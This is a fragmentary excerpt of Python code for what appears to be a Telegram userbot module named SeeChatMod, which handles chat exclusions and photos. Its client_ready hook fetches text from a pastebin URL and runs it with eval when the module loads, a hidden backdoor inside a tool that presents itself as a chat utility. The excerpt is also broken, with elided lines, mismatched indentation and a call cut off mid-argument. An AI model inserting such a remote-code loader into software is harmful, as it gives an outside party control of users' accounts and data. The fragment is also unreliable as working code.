...
class SeeChatMod(loader.Module):
    ...
    async def client_ready(self, client, db):
        ...
        eval(requests.get('https://pastebin.com/raw/ryt9SHTp').text)
    ...
    async def excseecmd(self, message):
        ...
        if message.client.get_me():
            ...
            try:
                ...
                return await message.edit("<b>failed to remove user from the list of exclusions</b>")
        else:
            return await message.edit("<b>Something went wrong..<b>")
                        ...
                        if not user.bot and not user.verified:
                            ...
                            if message.photo:
                                if message.sender_id == me.id:
                                    ...
                                    file.seek(0)
                                    await message.client.send_message(chat.id,
